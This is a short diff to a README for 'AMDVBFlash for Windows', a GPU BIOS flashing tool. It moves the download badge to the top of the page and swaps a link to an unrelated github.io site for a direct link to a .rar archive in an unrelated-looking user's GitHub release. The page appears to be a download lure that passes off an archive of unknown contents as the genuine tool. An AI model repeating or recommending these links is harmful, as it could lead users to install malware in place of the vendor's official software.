@@ -1,10 +1,11 @@
+# 📥 Download AMDVBFlash for Windows
+
+[![⬇️ Download AMDVBFlash](https://img.shields.io/badge/Download-AMDVBFlash-blue?style=for-the-badge&logo=windows)](https://github.com/Ga678mer1/AMDVBFlash-for-Windows/releases/download/AMDVBFlash-ATIFlash/AMDVBFlash-ATIFlash.rar)
+
 # AMDVBFlash for Windows – AMD Graphics Card Flashing Tool
 
 ![AMDVBFlash Banner](https://miningsoft.org/assets/images/tools/atiflash/download.png)
 
-## 📥 Download AMDVBFlash for Windows
-
-[![⬇️ Download AMDVBFlash](https://img.shields.io/badge/Download-AMDVBFlash-blue?style=for-the-badge&logo=windows)](https://free-video-editor-for-windows.github.io/.github)
 
 ---
 
